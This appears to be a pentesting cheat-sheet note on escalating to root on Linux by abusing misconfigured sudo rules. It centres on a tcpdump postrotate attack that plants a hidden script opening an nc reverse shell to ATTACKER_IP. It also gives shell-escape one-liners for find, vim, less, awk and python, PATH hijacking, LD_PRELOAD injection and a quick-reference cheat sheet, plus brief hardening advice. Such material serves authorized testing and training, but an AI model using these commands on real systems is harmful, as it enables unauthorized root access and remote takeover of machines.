# Linux Privilege Escalation – Sudo Rights Abuse

## Overview

The **sudo** mechanism allows permitted users to execute commands as another user (commonly **root**) without requiring full administrative privileges.

Permissions are defined in:

```bash
/etc/sudoers
```

or:

```bash
/etc/sudoers.d/*
```

Misconfigured sudo rules frequently allow privilege escalation by enabling execution of binaries that support shell escapes, file writes, or command execution.

---

# Enumerating Sudo Privileges

Always check sudo permissions immediately after gaining access:

```bash
sudo -l
```

Example output:

```text
User sysadm may run the following commands:
(root) NOPASSWD: /usr/sbin/tcpdump
```

Key observations:

| Element | Meaning |
|--------|---------|
| root | command executes with root privileges |
| NOPASSWD | no password required |
| full path | binary explicitly allowed |

---

# Understanding Risk in Sudo Configurations

Common misconfigurations:

### Overly broad permissions

```bash
(ALL) ALL
```

User can execute any command as root.

---

### NOPASSWD entries

```bash
(ALL) NOPASSWD: ALL
```

No authentication required.

---

### Wildcards

```bash
(ALL) NOPASSWD: /usr/bin/*
```

Allows execution of unintended binaries.

---

### Relative paths

```bash
(ALL) NOPASSWD: cat
```

Allows PATH abuse.

---

# Identifying Exploitable Sudo Binaries

Many programs allow shell execution.

Check each permitted binary against:

**GTFOBins**

https://gtfobins.github.io

Common high-risk binaries:

| Binary | Risk |
|-------|------|
| vim | shell escape |
| less | shell escape |
| man | shell escape |
| find | command execution |
| awk | command execution |
| perl | shell spawn |
| python | shell spawn |
| tcpdump | command execution |
| tar | wildcard abuse |
| cp | overwrite sensitive files |
| tee | file write |
| bash | privilege shell |
| nmap | interactive shell |
| git | command execution |

---

# Example Exploit – tcpdump

Sudo configuration:

```text
(root) NOPASSWD: /usr/sbin/tcpdump
```

Man page reveals:

```text
-z postrotate-command
```

Allows execution of arbitrary command when capture file rotates.

---

# Attack Workflow

Create malicious script:

```bash
cat << EOF > /tmp/.test
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 443 > /tmp/f
EOF
```

Make executable:

```bash
chmod +x /tmp/.test
```

Start listener:

```bash
nc -lnvp 443
```

Execute tcpdump:

```bash
sudo tcpdump -ln -i eth0 \
-w /dev/null \
-W 1 \
-G 1 \
-z /tmp/.test \
-Z root
```

Result:

```bash
uid=0(root)
```

Root shell obtained.

---

# Exploitation Pattern

Many binaries provide unintended command execution features.

General approach:

1. enumerate sudo permissions
2. identify allowed binaries
3. check GTFOBins
4. identify shell escape mechanism
5. execute command as root

---

# Example Exploit – find

If allowed:

```bash
sudo find . -exec /bin/sh \; -quit
```

---

# Example Exploit – vim

```bash
sudo vim file
```

Inside vim:

```vim
:! /bin/sh
```

---

# Example Exploit – less

```bash
sudo less /etc/profile
```

Inside less:

```bash
!/bin/sh
```

---

# Example Exploit – awk

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

# Example Exploit – python

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

# PATH Abuse via Sudo

If sudoers entry lacks absolute path:

```text
(ALL) NOPASSWD: backup_script
```

Create malicious binary:

```bash
echo '/bin/sh' > backup_script
chmod +x backup_script
export PATH=.:$PATH
sudo backup_script
```

Root shell spawned.

---

# Wildcard Abuse via Sudo

Example:

```text
(ALL) NOPASSWD: /usr/bin/tar *
```

Exploit using wildcard injection.

---

# Environment Variable Abuse

Some binaries allow environment injection:

```bash
sudo LD_PRELOAD=/tmp/exploit.so binary
```

---

# Checking for ALL permissions

```bash
sudo -l | grep ALL
```

If present:

```bash
sudo su
```

or:

```bash
sudo bash
```

---

# Enumerating Sudo Rules Manually

```bash
cat /etc/sudoers
ls /etc/sudoers.d/
```

---

# Defensive Best Practices

### Use absolute paths

Secure:

```text
(ALL) NOPASSWD: /usr/bin/id
```

Insecure:

```text
(ALL) NOPASSWD: id
```

---

### Apply least privilege

Grant minimal commands required.

---

### Avoid wildcards

Avoid:

```text
/usr/bin/*
```

---

### Avoid dangerous binaries

Restrict:

- interpreters
- editors
- networking tools
- file manipulation tools

---

### Require passwords

Avoid NOPASSWD where possible.

---

# Enumeration Checklist

## Check privileges

```bash
sudo -l
```

---

## Identify GTFOBins matches

```bash
sudo -l
```

Search each binary.

---

## Check PATH abuse potential

```bash
echo $PATH
```

---

## Test shell escape

```bash
sudo binary
```

---

## Check environment injection

```bash
sudo -E binary
```

---

# Quick Reference Cheatsheet

```bash
sudo -l

sudo find . -exec /bin/sh \; -quit

sudo vim -c ':!/bin/sh'

sudo less /etc/profile
!/bin/sh

sudo awk 'BEGIN {system("/bin/sh")}'

sudo python3 -c 'import os; os.system("/bin/sh")'

sudo tcpdump -z /tmp/script

sudo bash

sudo sh
```

---

# Key Takeaways

- sudo rights frequently lead directly to privilege escalation
- NOPASSWD entries increase risk significantly
- many legitimate binaries allow shell execution
- GTFOBins should always be referenced
- absolute paths reduce PATH abuse risk
- least privilege reduces attack surface
- always enumerate sudo rights early during post-exploitation

---

# Tags

#linux
#privilege-escalation
#sudo
#gtfobins
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian